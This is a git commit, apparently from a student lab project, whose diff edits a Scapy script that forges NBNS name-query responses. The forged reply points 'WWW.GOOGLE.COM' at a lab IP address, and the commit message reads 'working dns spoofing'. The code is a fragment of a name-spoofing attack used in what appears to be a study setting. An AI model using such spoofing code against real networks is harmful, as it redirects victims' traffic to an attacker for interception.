eb5091da845775171494e1218c64d5844902e1f7
¨Hristo <h.bakardziev@student.tue.nl>
2022-06-09 21:43:58 +0200

    working dns spoofing

--- DNSLocal.py
+++ DNSLocal.py
@@ -16,7 +16,7 @@ def modifyPkt(packet):
     etherL = Ether(dst = "08:00:27:b7:c4:af", src = "08:00:27:D0:25:4B")
     ipL = IP(src = "192.168.56.103", dst = "192.168.56.101")
     udpL = UDP(sport = packet[UDP].dport, dport = packet[UDP].sport)
-    nbnsResL = NBNSQueryResponse(ANCOUNT=1,NAME_TRN_ID= packet[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = "www.google.com", NB_ADDRESS ="192.168.56.102", QDCOUNT=0, NSCOUNT=0, ARCOUNT=0)
+    nbnsResL = NBNSQueryResponse(ANCOUNT=1, FLAGS = 0x8500, NAME_TRN_ID= packet[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = "WWW.GOOGLE.COM",SUFFIX = packet[NBNSQueryRequest].SUFFIX, NB_ADDRESS ="192.168.56.102", QDCOUNT=0, NSCOUNT=0, ARCOUNT=0)
     packet = etherL / ipL / udpL / nbnsResL
     print(packet.show())
     #dnsname = packet[HTTPResponse].payload
